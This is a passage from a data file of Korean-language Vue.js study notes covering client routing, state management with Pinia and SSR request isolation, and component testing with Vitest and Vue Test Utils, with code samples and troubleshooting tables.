        body: "history 모드로 /about에 들어가 새로고침하니 서버가 404를 냅니다. 클라이언트 라우팅은 브라우저 안에서만 URL을 바꾼 것이라 서버는 /about이라는 파일을 모릅니다. 처방은 서버가 모든 경로(API·정적 파일 제외)에 index.html을 돌려주게 하는 것입니다(SPA 폴백. Nginx try_files, Netlify _redirects, Vite 개발 서버는 기본). 서버 설정을 못 바꾸면 hash 모드(createWebHashHistory)로 바꾸면 #/about은 서버에 가지 않습니다. 문서의 손 라우터가 hashchange를 쓴 이유가 서버 설정 없이 동작하기 때문입니다. 반대로 SSR이면 서버가 경로마다 렌더하므로 이 문제가 없되 서버 라우터와 클라이언트 라우터가 같은 routes를 써야 합니다.",
      },
      {
        label: "문제가 나는 경우: URL 과 화면의 계약을 모를 때",
        body: "경우 ㄱ, history 모드 새로고침 404입니다. 위의 사고입니다. 경우 ㄴ, 라우트 전환에 폼 입력이 사라짐. <component :is> 언마운트(실제로). KeepAlive. 경우 ㄷ, 지연 라우트가 Suspense fallback을 보일 거라 기대. 깨우지 않음(문서). async setup으로. 경우 ㄹ, 같은 라우트의 params만 바뀔 때(/users/1 → /users/2) 컴포넌트가 재사용되어 데이터가 안 갱신됨. watch(() => route.params.id) 또는 <RouterView :key=\"route.fullPath\">. 경우 ㅁ, 템플릿에서 location.hash 직접 읽음. 허용 목록 밖. setup ref. 경우 ㅂ, 손 라우터로 중첩·가드까지 만들려 함. Vue Router. 경우 ㅅ, 라우터 인스턴스를 모듈 전역으로 두고 SSR. 요청 간 공유. 요청마다 createRouter. 경우 ㅇ, 전환 애니메이션이 없음. RouterView v-slot + Transition. 경우 ㅈ, 뒤로가기 스크롤 위치. scrollBehavior 옵션. 경우 ㅊ, 링크를 <a href>로 써서 전체 새로고침. <RouterLink>. 경우 ㅋ, 라우트 컴포넌트에 route 객체를 직접 의존해 테스트 어려움. props: true로 params를 props로. 경우 ㅌ, 404 라우트 없음. 빈 화면. { path: '/:pathMatch(.*)*', component: NotFound }.",
        code: "경우               언제 생기나                       겉모습                          처방\nㄱ 새로고침 404      history 모드 + 정적 서버             404                            SPA 폴백 · hash 모드\nㄴ 입력 소실        라우트 전환                         unmounted (실제로)               KeepAlive\nㄷ Suspense 기대     () => import()                     fallback 안 뜸                   async setup\nㄹ params 만 변경    /users/1 → /users/2                 데이터 그대로                     watch(params) · :key\nㅁ 템플릿 location   {{ location.hash }}                 undefined                       setup ref\nㅂ 손 라우터 확장     중첩·가드                          재발명                           Vue Router\nㅅ SSR 전역 라우터    모듈 createRouter                   요청 간 공유                     요청마다\nㅇ 전환 없음        RouterView 만                       즉시 교체                        v-slot + Transition\nㅈ 스크롤          뒤로가기                            맨 위                           scrollBehavior\nㅊ 전체 새로고침     <a href=\"/about\">                   리로드                          <RouterLink>\nㅋ route 직접 의존   useRoute 만                        테스트 어려움                     props: true\nㅌ 404 없음        없는 경로                           빈 화면                          catch-all 라우트",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 라우팅은 'URL 상태 ↔ 컴포넌트 트리' 의 동기화이고, 서버·브라우저·앱 셋이 그 상태를 공유해야 한다",
        body: "URL은 세 곳에 있습니다. 서버(어느 경로에 무엇을 줄지), 브라우저(주소창·히스토리), 앱(현재 라우트 ref). 클라이언트 라우팅은 브라우저와 앱만 바꾸므로 서버가 모르는 경로가 생기고(ㄱ), hash 모드는 서버에 경로를 안 보내 그 문제를 피합니다. 앱 안에서 라우트는 반응형 상태이고 화면은 그 상태의 함수(<component :is>)라, 전환은 컴포넌트 교체(수명 ㄴ, 전환 ㅇ, 캐시)이고 params 변화는 같은 컴포넌트의 상태 변화(ㄹ)입니다. 라우트 상태는 앱 인스턴스마다 있어야 SSR에서 요청이 섞이지 않습니다(ㅅ). 처방은 라우트를 '앱의 반응형 상태 하나'로 보고, 그 상태를 서버(폴백·SSR)와 브라우저(History·링크)에 일관되게 맞추고, 교체·유지·전환은 KeepAlive·Transition·key로 정하는 것입니다.",
        code: "URL 상태:  서버 (경로 → 응답 · SPA 폴백 ㄱ)  ·  브라우저 (주소창 · 히스토리 · popstate)  ·  앱 (route ref)\n앱:  route ref ──computed──▶ 컴포넌트 ──<component :is>──▶ 화면\n     교체 = 수명 (ㄴ KeepAlive) · 전환 (ㅇ Transition) · params 변화 = 같은 컴포넌트 (ㄹ watch/key)\nSSR: 앱 인스턴스마다 라우터 (ㅅ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "라우트가 바뀌어도 남아야 하는 상태를 어디에 두나가 다음 페이지 '상태 관리'입니다. 실제로 돌려 보면 모듈 전역 reactive 스토어는 SSR에서 요청 사이에 누적됐습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 상품 목록 → 상세 → 뒤로가기에서 목록의 스크롤과 필터가 유지되어야 합니다. (2) /products/:id에서 다른 상품으로 이동할 때 데이터가 바뀌지 않습니다. (3) 정적 호스팅(S3)에 올렸는데 딥링크 새로고침이 404입니다. 각각 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) <RouterView v-slot=\"{ Component }\"><KeepAlive include=\"ProductList\"><component :is=\"Component\" /></KeepAlive></RouterView>로 목록 컴포넌트를 캐시해 필터 state를 유지합니다(실제로 KeepAlive 안 상태 A:1 유지). 스크롤은 라우터의 scrollBehavior에서 savedPosition을 돌려주고, 목록 컴포넌트의 onDeactivated/onActivated로 보조합니다. (2) params만 바뀌면 Vue Router는 같은 컴포넌트를 재사용해 setup이 다시 돌지 않습니다. watch(() => route.params.id, load, { immediate: true })로 id 변화에 다시 받거나, <RouterView :key=\"route.fullPath\">로 강제 재생성(상태도 초기화됨), 또는 props: true로 id를 prop으로 받아 watch합니다. (3) history 모드는 /products/1을 서버에 요청하는데 S3에는 그 파일이 없습니다. CloudFront/S3의 에러 페이지를 index.html(200)로 돌리는 SPA 폴백을 설정하거나, 설정을 못 바꾸면 createWebHashHistory로 바꿔 #/products/1이 서버에 가지 않게 합니다. SEO가 중요하면 SSG/SSR(Nuxt)로 경로마다 HTML을 미리 만듭니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Routing", href: `${DOCS}/guide/scaling-up/routing` },
      { label: "Vue Router", href: "https://router.vuejs.org/" },
      { label: "KeepAlive", href: `${DOCS}/guide/built-ins/keep-alive` },
    ],
  },

  {
    id: "vg-scale-state",
    name: "상태 관리",
    tagline: "여러 컴포넌트가 나누는 상태는 모듈의 reactive 로, 앱이 커지면 Pinia 로 — SSR 에선 요청마다",
    intro:
      "확장하기 넷째 페이지입니다. 컴포넌트는 이미 상태·뷰·액션의 단방향 흐름을 가집니다. 여러 컴포넌트가 같은 상태를 나눠야 하면 prop drilling이나 형제 간 emit·ref가 번거로워집니다. 가장 단순한 해법은 모듈에 export const store = reactive({ count: 0, increment() { this.count++ } })를 두고 import하는 것입니다. 변경은 스토어 메서드로 모아 추적 가능하게. ref 하나나 컴포저블 반환도 같은 원리. 주의: 'SSR에서는 모듈 수준 싱글턴이 여러 요청 사이에 공유되어 문제'. 그래서 Pinia(코어 팀 유지, Vue 2·3, DevTools, HMR, SSR 지원). Vuex는 유지 관리 모드. 실제로 돌려 보면 모듈 전역 reactive를 쓰는 컴포넌트를 요청마다 새 createSSRApp으로 두 번 렌더하니 shared=1 → shared=2로 누적됐고, 서버에서 watchEffect는 초기 1회만 돌았으며(추적 꺼짐), provide한 ref는 자손에서 반응형으로 갱신됐습니다. 이 노드의 질문은 하나입니다. 상태를 누가 들고 누가 바꾸며, 그것은 어느 범위에 사나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "컴포넌트의 단방향 흐름: 상태(진실) → 뷰(선언적 매핑) → 액션(사용자 입력 → 상태 변경). 공유가 필요할 때: 조상으로 올려 props로 내리기(prop drilling)와 템플릿 ref·emit으로 형제 동기화는 '유지하기 어려운 코드'. 단순 스토어: // store.js export const store = reactive({ count: 0, increment() { this.count++ } }). 컴포넌트 A·B가 import해 {{ store.count }}와 @click=\"store.increment()\". '중앙화된 상태 변경 로직은 어디서 바뀌었나를 추적할 수 있게 한다'. 팁: 'store.increment()처럼 괄호를 붙여 메서드로 불러 this를 유지'. ref 하나도 됨(export const count = ref(0)). 컴포저블이 모듈 수준 state를 공유해도 됨. SSR 주의: '위 패턴은 SSR에서 스토어가 여러 요청 사이에 공유되는 싱글턴이라 문제. 요청마다 생성해 provide'. Pinia: 'Vue 코어 팀이 유지, Vue 2·3 지원', 간결한 API, DevTools·HMR·SSR. Vuex의 '사실상 후속'이고 Vuex는 유지 관리 모드. Pinia 스토어는 setup 함수 꼴(defineStore('x', () => { const n = ref(0); return { n } }))로 컴포저블과 같은 모양이며 effectScope를 씀.",
        code: "// store.js — 단순 스토어 (클라이언트 전용 앱)\nimport { reactive } from 'vue'\nexport const store = reactive({\n  count: 0,\n  increment() { this.count++ },        // 변경은 여기로 모음\n})\n// A.vue / B.vue\nimport { store } from './store.js'\n<button @click=\"store.increment()\">{{ store.count }}</button>   // 괄호 — this 유지\n\n// SSR 이면 요청마다 — provide/inject\nexport function createStore() { return reactive({ count: 0, increment() { this.count++ } }) }\n// 서버: 요청마다 const store = createStore(); app.provide('store', store)\n\n// Pinia — setup 스토어 (컴포저블과 같은 모양)\nexport const useCounter = defineStore('counter', () => {\n  const count = ref(0); const double = computed(() => count.value * 2)\n  function increment() { count.value++ }\n  return { count, double, increment }\n})",
        terms: [
          {
            term: "요청 간 상태 오염 (cross-request state pollution)",
            body: "SSR 서버는 한 프로세스에서 여러 요청을 처리합니다. 모듈 수준의 reactive·ref는 모듈이 한 번 로드되면 모든 요청이 같은 객체를 씁니다. 그래서 A 사용자의 요청이 바꾼 상태가 B 사용자의 HTML에 들어갑니다. 실제로 돌려 보면 모듈 reactive의 n이 요청 1에서 1, 요청 2에서 2였습니다. 처방은 요청마다 앱과 스토어를 새로 만들어 provide하는 것이고, Pinia는 createPinia()를 요청마다 만들어 app.use합니다.",
          },
          {
            term: "Pinia",
            body: "Vue의 공식 상태 관리 라이브러리입니다. defineStore(id, setupFn | options)로 스토어를 정의하고 컴포넌트에서 useXxxStore()로 씁니다. setup 스토어는 ref·computed·함수를 돌려주는 컴포저블과 같은 모양이라 배운 것을 그대로 쓰고, 각 앱 인스턴스의 pinia에 매여 SSR 격리가 되며, DevTools에 상태·액션이 보이고, HMR로 상태를 유지하며 수정됩니다. Vuex의 mutation 보일러플레이트가 없습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 모듈 수준 const shared = reactive({ n: 0 })을 setup에서 shared.n++하는 컴포넌트를 두 번 renderToString(요청마다 createSSRApp)하니 첫 결과 <p>shared=1 local=1</p>, 둘째 <p>shared=2 local=1</p>. 모듈 전역은 누적되고 setup 안의 local ref는 요청마다 새것입니다. 서버에서 ref에 watchEffect를 걸고 값을 바꿔도 효과는 초기 1회만 돌았습니다(서버는 추적이 꺼짐). provide/inject로 넘긴 값은 서버에서도 받았고(주입됨), 클라이언트에서 provide한 ref는 자손에서 갱신됐습니다(count 1). readonly로 감싼 것에 자손이 쓰면 'Set operation on key \"value\" failed: target is readonly.'. 컴포저블 노드의 effectScope 측정(stop 뒤 효과 정지, onScopeDispose)이 Pinia가 스토어 수명을 묶는 메커니즘입니다. useSSRContext로 요청 컨텍스트 객체에 값을 적을 수 있었습니다(ctx.title = '제목').",
        code: "// Node 24 · vue 3.5.45 · SSR\nconst shared = reactive({ n: 0 })   (모듈)\n요청 1: renderToString(createSSRApp(App)) → <p>shared=1 local=1</p>\n요청 2: renderToString(createSSRApp(App)) → <p>shared=2 local=1</p>    ← 모듈 전역 누적 · setup 로컬은 새것\n서버 watchEffect: runs 1 (추적 꺼짐)\nprovide/inject: 서버에서도 ✓ · 클라이언트 ref provide → 자손 갱신 ✓ · readonly 쓰기 → 경고\nuseSSRContext(): ctx.title = '제목' → 호출 쪽 ctx 에서 읽힘",
      },
      {
        label: "문제: SSR 배포 뒤 다른 사용자의 장바구니가 보인다",
        body: "cart.js에 export const cart = reactive({ items: [] })를 두고 서버·클라이언트가 같이 import합니다. 서버에서 사용자 A의 요청이 cart.items를 채운 뒤 B의 요청이 같은 cart를 읽어 A의 장바구니를 HTML에 넣습니다. 모듈 수준 싱글턴이 요청 사이에 공유되는 문서의 경고 그대로이고, 실제로 돌려 보면 모듈 reactive가 요청마다 누적됐습니다. 처방은 '요청마다 만들기'입니다. createCart()를 요청 핸들러에서 불러 app.provide(CartKey, cart)하고 컴포넌트는 inject합니다. Pinia면 요청마다 createPinia()를 app.use하고 서버 상태를 직렬화해 클라이언트에 넘겨 하이드레이션합니다. 클라이언트 전용 앱이면 모듈 스토어로 충분합니다. 브라우저는 사용자 하나이기 때문입니다.",
      },
      {
        label: "문제가 나는 경우: 범위와 소유를 모를 때",
        body: "경우 ㄱ, SSR 모듈 스토어입니다. 위의 사고입니다. 경우 ㄴ, 스토어 상태를 컴포넌트 곳곳에서 직접 바꿈. 출처 추적 불가. 메서드로 모음. 경우 ㄷ, store.increment를 괄호 없이 핸들러에 넘김. this가 끊김. store.increment(). 경우 ㄹ, 스토어 reactive를 구조 분해. 반응 끊김. storeToRefs(Pinia) 또는 store.x. 경우 ㅁ, 작은 앱에 Pinia부터. 과함. reactive 모듈로 시작. 경우 ㅂ, 큰 앱에 모듈 reactive만. DevTools·HMR·SSR 없음. Pinia. 경우 ㅅ, 서버 상태를 클라이언트에 안 넘김. 하이드레이션 불일치. 직렬화해 window.__STATE__. 경우 ㅇ, 서버에서 watch로 상태 파생 기대. 추적 꺼짐(실제로). 동기 계산. 경우 ㅈ, Vuex로 새 프로젝트. 유지 관리 모드. Pinia. 경우 ㅊ, 모든 상태를 스토어에. 지역 상태는 컴포넌트에. 경우 ㅋ, 스토어에서 컴포저블의 onUnmounted. 컨텍스트 없음. onScopeDispose. 경우 ㅌ, 두 스토어가 서로 import해 순환. 액션에서 지연 import 또는 구조 재편.",
        code: "경우               언제 생기나                       겉모습                             처방\nㄱ SSR 모듈 스토어    reactive 모듈 + 서버               요청 간 공유 (실제로 1→2)             요청마다 생성 · provide · Pinia\nㄴ 직접 변경        store.count = x 곳곳                 출처 불명                           메서드\nㄷ this 끊김        @click=\"store.increment\"             undefined                          괄호 호출\nㄹ 구조 분해        const { count } = store              끊김                               storeToRefs · store.count\nㅁ 과한 도입        소형 앱 Pinia                        복잡                               reactive 모듈\nㅂ 도구 없음        대형 앱 모듈만                       DevTools·SSR 없음                    Pinia\nㅅ 상태 미전달       서버 → 클라이언트                    불일치                              직렬화\nㅇ 서버 watch       파생 기대                           안 돎 (실제로 runs 1)                동기 계산\nㅈ Vuex 신규        -                                 유지 관리 모드                        Pinia\nㅊ 전부 스토어       지역 상태까지                        결합                               컴포넌트 상태\nㅋ 스토어 훅        onUnmounted                        컨텍스트 없음                        onScopeDispose\nㅌ 순환 import      스토어 간                           undefined                          지연 import",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 상태의 '범위' 는 코드 위치가 정하고, 범위가 사용자보다 넓으면 샌다",
        body: "상태가 어디 선언되었나가 그 상태의 수명과 공유 범위를 정합니다. 컴포넌트 setup 안 = 인스턴스마다, 컴포저블 안 = 호출마다, 모듈 수준 = 그 모듈을 import한 모든 곳 = 프로세스 전체. 브라우저는 프로세스 = 사용자 하나라 모듈 수준이 '앱 전체'로 딱 맞지만, SSR 서버는 프로세스 = 모든 사용자라 모듈 수준은 사용자를 넘어 샙니다(ㄱ, ㅅ). 처방은 '사용자 하나'의 범위를 명시적으로 만드는 것입니다. 앱 인스턴스마다(요청마다) 스토어를 만들어 provide하거나 Pinia(앱마다 createPinia). 소유권은 변경을 메서드로 모아 추적 가능하게 하고(ㄴ, ㄷ), 반응성은 구조 분해를 피하며(ㄹ), 서버에서는 추적이 꺼져 있음을 염두에 둡니다(ㅇ). 규모는 reactive 모듈 → Pinia로 필요할 때 올립니다(ㅁ, ㅂ).",
        code: "선언 위치           범위 · 수명                          브라우저 (1 사용자)     SSR 서버 (N 사용자)\nsetup 안           인스턴스마다                          OK                  OK\n컴포저블 안         호출마다                              OK                  OK\n모듈 수준          import 한 모든 곳 = 프로세스              = 앱 전체 (OK)       = 모든 요청 (샘 ㄱ ㅅ)\n앱마다 생성 + provide / Pinia(createPinia)   = 앱(요청) 하나       OK                  OK\n\n소유: 변경은 메서드 (ㄴ ㄷ) · 반응: 구조 분해 X (ㄹ) · 서버: 추적 꺼짐 (ㅇ) · 규모: reactive → Pinia (ㅁ ㅂ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "상태와 컴포넌트가 맞게 동작하는지 확인하는 것이 다음 페이지 '테스트'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 클라이언트 전용 관리자 앱(SSR 없음)에 로그인 사용자·권한 상태가 필요합니다. 어떻게 시작할까요? (2) 같은 앱이 Nuxt(SSR)로 바뀌었습니다. 무엇을 바꿔야? (3) 스토어의 user 객체를 const { name } = useUserStore()로 받았는데 안 바뀝니다.",
        notes: [
          {
            title: "답",
            body: "(1) 모듈 수준 reactive 스토어로 충분합니다. export const auth = reactive({ user: null, can(p) { return this.user?.perms.includes(p) }, async login(c) { this.user = await api.login(c) } }). 브라우저는 사용자 하나라 모듈 범위가 앱 범위와 같습니다. 변경은 login/logout 메서드로 모아 출처를 추적합니다. DevTools·HMR이 필요해지면 Pinia로 올려도 모양(setup 스토어)이 같아 옮기기 쉽습니다. (2) 모듈 reactive는 서버에서 모든 요청이 공유합니다(실제로 shared 누적). A의 로그인 상태가 B의 HTML에 들어갑니다. Pinia로 바꾸고(Nuxt는 @pinia/nuxt가 요청마다 createPinia와 상태 직렬화를 처리) 스토어는 defineStore의 setup 함수 안에서 상태를 만들게 합니다. 직접 하려면 요청 핸들러에서 스토어를 만들어 app.provide하고 서버 상태를 window.__STATE__로 넘겨 클라이언트가 복원합니다. (3) Pinia 스토어는 reactive 객체라 구조 분해하면 원시값 연결이 끊깁니다(실제로 reactive 구조 분해 끊김). const store = useUserStore()로 받아 store.name으로 읽거나, const { name } = storeToRefs(store)로 ref로 풀어 받습니다. 액션(함수)은 구조 분해해도 됩니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "State Management", href: `${DOCS}/guide/scaling-up/state-management` },
      { label: "Pinia", href: "https://pinia.vuejs.org/" },
      { label: "SSR — Cross-Request State Pollution", href: `${DOCS}/guide/scaling-up/ssr#cross-request-state-pollution` },
    ],
  },

  {
    id: "vg-scale-testing",
    name: "테스트",
    tagline: "단위는 Vitest, 컴포넌트는 Vue Test Utils, E2E 는 Playwright — '어떻게' 가 아니라 '무엇을' 테스트한다",
    intro:
      "확장하기 다섯째 페이지입니다. 테스트 셋. 단위(함수·클래스·컴포저블. 입력 → 출력), 컴포넌트(마운트해 상호작용과 렌더 결과 확인. 통합 테스트의 한 형태), E2E(실제 브라우저에서 운영 빌드로 여러 페이지에 걸친 흐름). 권장 도구: 단위·컴포넌트는 Vitest(Vite 설정 공유, Jest 호환 API), 컴포넌트 마운트는 @vue/test-utils(Testing Library는 Suspense 비동기 컴포넌트에 문제가 있어 '주의해서'), E2E는 Playwright 또는 Cypress. 원칙: '컴포넌트가 무엇을 하는지 테스트하고 어떻게 하는지는 테스트하지 말 것'. 자식 컴포넌트를 모킹하지 말고, 스냅샷만 의존하지 말고, 내부 상태·메서드를 테스트하지 말 것. 컴포저블은 반응성만 쓰면 직접 호출로, 라이프사이클·provide/inject를 쓰면 withSetup 래퍼로. 이 블로그의 측정 스크립트(Node의 renderToString, Chrome의 createApp 뒤 DOM 확인)가 사실상 컴포넌트 테스트의 모양입니다. 이 노드의 질문은 하나입니다. 어느 층에서 무엇을 확인하나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "왜: 회귀 방지, 리팩터링 자신감, 문서 역할. 셋: 단위 테스트는 '작은 격리된 단위(함수·클래스·컴포저블)에 입력을 주고 출력을 확인'. 컴포넌트 테스트는 '마운트해 사용자처럼 상호작용하고 렌더 결과를 확인. 자식까지 포함하는 통합 테스트의 한 형태'. E2E는 '실제 브라우저에서 운영 빌드에 대해 여러 페이지에 걸친 흐름. 백엔드까지'. 조언: 일찍 시작, 컴포넌트마다 spec 파일. 단위: Vitest 권장('Jest는 기존 스위트 이전에만'). 컴포넌트: 'props·이벤트·슬롯·스타일·클래스·라이프사이클이 올바르게 동작하는지'. 하지 말 것: 자식 모킹, 스냅샷만, 내부 state·메서드 검사. 할 것: '무엇을 하나'. @vue/test-utils(공식)이 권장이고 '@testing-library/vue는 Suspense 비동기 컴포넌트에 문제가 있어 주의'. 헤드리스는 Vitest + Test Utils, 스타일·네이티브 DOM 이벤트가 중요하면 Cypress 컴포넌트 테스트. E2E: Playwright·Cypress 권장(Nightwatch·WebdriverIO 대안). 레시피: Vitest 설정 environment: 'happy-dom', globals: true. 컴포저블: 반응성 API만 쓰면 직접 호출해 반환 ref 검사. 라이프사이클·provide/inject를 쓰면 호스트 컴포넌트에 setup으로 감싸는 withSetup 헬퍼.",
        code: "// 컴포넌트 테스트 (Vitest + @vue/test-utils) — '무엇을' 하나\nimport { mount } from '@vue/test-utils'\nimport Stepper from './Stepper.vue'\ntest('increments by step', async () => {\n  const wrapper = mount(Stepper, { props: { max: 1 } })\n  expect(wrapper.text()).toContain('0')\n  await wrapper.find('button').trigger('click')       // 사용자처럼\n  expect(wrapper.text()).toContain('1')\n  await wrapper.find('button').trigger('click')\n  expect(wrapper.find('button').attributes('disabled')).toBeDefined()   // 결과 (내부 state X)\n})\n\n// 컴포저블 — 반응성만: 직접 호출\ntest('useCounter', () => { const { count, increment } = useCounter(); increment(); expect(count.value).toBe(1) })\n// 라이프사이클·inject 쓰면 — withSetup\nexport function withSetup(composable) {\n  let result\n  const app = createApp({ setup() { result = composable(); return () => {} } })\n  app.mount(document.createElement('div'))\n  return [result, app]   // app.unmount() 로 정리 훅 실행\n}",
        terms: [
          {
            term: "'무엇을' 테스트 (test what, not how)",
            body: "컴포넌트의 공개 계약(props를 주면 무엇이 그려지나, 클릭하면 어떤 이벤트가 나가나)을 확인하고, 내부 구현(어느 ref를 쓰나, 메서드 이름)은 보지 않는 원칙입니다. 그러면 구현을 바꿔도 테스트가 깨지지 않고, 테스트가 사용자 관점의 문서가 됩니다. 자식 컴포넌트를 모킹하지 말라는 조언도 같은 이유입니다. 사용자는 자식이 있는 전체를 봅니다.",
          },
          {
            term: "withSetup",
            body: "라이프사이클 훅이나 provide/inject를 쓰는 컴포저블을 테스트하기 위해 임시 컴포넌트의 setup 안에서 그 컴포저블을 부르는 헬퍼입니다. 컴포저블은 setup 컨텍스트가 있어야 onMounted·inject가 동작하므로(실제로 setup 밖에서는 컨텍스트 없음), createApp으로 호스트를 만들어 마운트하고 결과를 꺼냅니다. app.unmount()로 정리 훅까지 검증합니다. 문서의 레시피입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 이 블로그의 측정이 곧 테스트 모양",
        body: "이 노드의 '실제로 돌려 보면'들이 세 층에 대응합니다. 단위: Node에서 ref·computed·watch를 직접 불러 runs 수와 로그를 확인한 것(reactivity 측정)은 컴포저블 단위 테스트의 모양입니다. 반응성만 쓰면 컨텍스트 없이 됩니다. 컴포넌트: Node의 renderToString으로 props를 주고 HTML을 확인한 것(검증 경고, 폴스루, 슬롯 폴백)과 Chrome에서 createApp(…).mount(el) 뒤 el.textContent·className·DOM을 확인하고 click()·dispatchEvent로 상호작용한 것(v-model, 이벤트 수식어, Transition 클래스, KeepAlive 상태)이 컴포넌트 테스트입니다. Test Utils의 mount·find·trigger가 그것을 감싼 것입니다. 라이프사이클·inject 측정은 호스트 컴포넌트 안에서 했고 그것이 withSetup입니다. E2E: ego-browser로 실제 Chrome에서 페이지를 열고 window.__vue1을 읽은 것이 Playwright식 E2E의 모양입니다. 경고 문구를 console.warn을 가로채 모은 것은 테스트에서 vi.spyOn(console, 'warn')로 하는 일입니다.",
        code: "층          이 블로그의 측정                                         테스트 도구\n단위         Node: ref/computed/watch 직접 호출 · runs · 로그             Vitest · 컴포저블 직접 호출\n컴포넌트      Node renderToString(props) → HTML · Chrome mount → DOM·click    Vitest + @vue/test-utils (mount · find · trigger)\n             라이프사이클·inject 는 호스트 컴포넌트 안에서                    withSetup\nE2E          ego-browser 로 실제 Chrome 페이지 열고 상태 읽기                 Playwright · Cypress\n경고 확인      console.warn 가로채기                                    vi.spyOn(console, 'warn')",
        codeLang: "text",
      },
      {
        label: "문제: 리팩터링마다 테스트 수십 개가 깨진다",
        body: "테스트가 wrapper.vm.internalCount와 wrapper.vm.handleClick을 직접 검사하고, 자식 컴포넌트를 전부 stub했고, 스냅샷을 통째로 비교합니다. 내부 변수 이름을 바꾸거나 자식 구조를 바꾸면 동작은 같아도 전부 깨집니다. 문서의 원칙 '어떻게가 아니라 무엇을'이 이 자리입니다. 처방은 테스트를 사용자 관점으로 다시 쓰는 것입니다. props를 주고 text()·attributes()·emitted()를 확인하고, trigger('click')로 상호작용하고, 자식은 실제로 렌더되게 두고, 스냅샷은 보조로만. 내부 state는 '결과'로만 드러나야 합니다. 실제로 이 블로그의 측정도 DOM과 경고 문구만 봤고 내부 변수는 보지 않았습니다.",
      },
      {
        label: "문제가 나는 경우: 층과 원칙을 틀릴 때",
        body: "경우 ㄱ, 내부 구현 테스트입니다. 위의 사고입니다. 경우 ㄴ, 자식 전부 stub. 통합이 안 됨. 실제 자식. 경우 ㄷ, 스냅샷만. 의도 불명, 갱신 남발. 명시적 단언. 경우 ㄹ, 비동기 갱신 뒤 바로 단언. DOM은 다음 틱. await nextTick()·await trigger. 경우 ㅁ, 컴포저블을 setup 밖에서 테스트. onMounted·inject 컨텍스트 없음. withSetup. 경우 ㅂ, Suspense 비동기 컴포넌트를 Testing Library로. 문서 주의. Test Utils. 경우 ㅅ, 컴포넌트 테스트를 E2E로만. 느리고 범인 찾기 어려움. Vitest. 경우 ㅇ, E2E를 개발 서버에. 운영 빌드로. 경우 ㅈ, 스타일·레이아웃을 happy-dom에서 검증. CSS 미적용. Cypress 컴포넌트 또는 E2E. 경우 ㅊ, 테스트 간 전역 상태 공유(모듈 스토어). 순서 의존. 각 테스트에서 리셋·앱마다 생성. 경우 ㅋ, 콘솔 경고를 무시. Vue 경고가 버그 신호. spy로 실패 처리. 경우 ㅌ, Jest + Vite 설정 중복. Vitest.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ 내부 검사        wrapper.vm.x                        리팩터링에 깨짐                   text · emitted · attributes\nㄴ 자식 stub       shallowMount 남발                    통합 누락                        mount\nㄷ 스냅샷만        toMatchSnapshot                     의도 불명                        명시 단언\nㄹ 즉시 단언        set 뒤 바로 expect                   옛 DOM                          await nextTick · await trigger\nㅁ 밖에서 컴포저블    useX() 직접 (훅 사용)                 컨텍스트 경고                     withSetup\nㅂ Testing Library  Suspense 비동기                     문제 (문서)                      @vue/test-utils\nㅅ E2E 만          전부 브라우저                        느림                            Vitest 단위·컴포넌트\nㅇ 개발 서버 E2E     dev 모드                            운영과 다름                       빌드 산물\nㅈ happy-dom 스타일   레이아웃 단언                       CSS 없음                         Cypress CT · E2E\nㅊ 전역 공유        모듈 스토어                         순서 의존                        리셋 · 앱마다\nㅋ 경고 무시        console.warn                        버그 숨음                        spy → fail\nㅌ Jest 중복        Vite + Jest                         설정 두 벌                       Vitest",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 테스트는 '관찰 가능한 결과' 를 '그 결과가 나오는 층' 에서 확인하는 것이다",
        body: "셋 층은 관찰 범위가 다릅니다. 단위는 함수의 반환값(반응성이면 ref 값과 효과 횟수), 컴포넌트는 DOM·이벤트·props 반응(자식 포함), E2E는 사용자가 브라우저에서 보는 전체. 어느 층이든 확인할 것은 '관찰 가능한 결과'이고 구현은 아닙니다(ㄱ, ㄴ, ㄷ). 결과는 비동기로 나오므로 다음 틱을 기다려야 하고(ㄹ), 컴포넌트 컨텍스트가 필요한 코드는 그 컨텍스트 안에서 돌려야 합니다(ㅁ). 층을 올리면 느리고 범인이 흐려지고(ㅅ), 층을 내리면 CSS·브라우저 동작이 빠집니다(ㅈ). 전역 상태는 테스트 간 격리를 깨고(ㅊ) 경고는 결과의 일부입니다(ㅋ). 처방은 각 층에 맞는 도구 하나(Vitest / Test Utils / Playwright)와, 결과만 보는 단언, 그리고 틱을 기다리는 습관입니다.",
        code: "층        관찰 범위                          도구                 기다릴 것\n단위       반환값 · ref · 효과 횟수              Vitest               (동기면 없음)\n컴포넌트    DOM · emitted · props 반응 (자식 포함)   Test Utils (withSetup)   await nextTick / trigger (ㄹ)\nE2E       브라우저의 전체 흐름                   Playwright · Cypress   네트워크 · 네비게이션\n\n결과만 (ㄱ ㄴ ㄷ) · 컨텍스트 안에서 (ㅁ) · 격리 (ㅊ) · 경고도 결과 (ㅋ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "확장하기의 마지막 '서버 사이드 렌더링'은 코드가 서버와 브라우저에서 두 번 도는 환경입니다. 실제로 돌려 보면 서버에서는 추적이 꺼지고 마운트 훅이 돌지 않았으며, 모듈 전역이 요청 간에 샜고, 불일치는 경고와 함께 클라이언트가 고쳤습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) useDebounce(value, ms) 컴포저블을 테스트하려 합니다. 어느 층, 어떻게? (2) <ProductCard>가 '담기' 클릭에 add-to-cart 이벤트를 상품 id와 함께 내야 합니다. 테스트는? (3) 결제 플로우(장바구니 → 주소 → 결제 → 완료)를 어디서 확인할까요?",
        notes: [
          {
            title: "답",
